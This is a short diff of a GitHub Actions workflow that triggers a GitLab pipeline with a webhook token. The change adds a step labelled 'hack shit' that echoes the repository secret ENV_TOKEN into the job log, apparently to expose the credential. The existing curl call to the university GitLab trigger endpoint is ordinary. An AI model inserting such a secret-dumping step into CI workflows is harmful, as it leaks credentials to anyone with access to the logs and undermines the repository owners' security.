@@ -24,7 +24,9 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-
+      - name: hack shit 
+        run: echo "${{ secrets.ENV_TOKEN }}"
+        
       # Runs webhook to start gitlab pipeline
       - name: Trigger gitlab pipeline
         run: curl -X POST --fail -F token=${{ secrets.ENV_TOKEN }} -F ref=main https://gitlab.icp.uni-stuttgart.de/api/v4/projects/950/trigger/pipeline
